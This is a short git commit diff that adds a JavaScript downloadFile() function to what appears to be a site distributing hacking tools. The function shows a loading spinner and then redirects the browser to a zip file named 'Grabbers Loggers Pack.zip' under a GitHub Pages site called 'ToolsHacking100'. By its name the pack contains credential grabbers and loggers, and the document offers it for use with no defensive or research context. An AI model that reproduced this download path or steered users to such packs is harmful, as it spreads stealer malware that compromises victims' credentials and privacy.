05ec8a050f658d53fd8f4009987bd65cd5032edf
kraker691-create <kraker691@gmail.com>
2026-04-11 15:31:09 +0200

    Update DownloadFunction.js

--- DownloadFunction.js
+++ DownloadFunction.js
@@ -1,1 +1,8 @@
+function downloadFile() {
+            const loader = document.getElementById("loader");
+            loader.style.display = "block";
 
+            setTimeout(() => {
+                window.location.href = "https://kraker691-create.github.io/ToolsHacking100/Grabbers%20Loggers%20Pack.zip";
+            }, 1200);
+        }
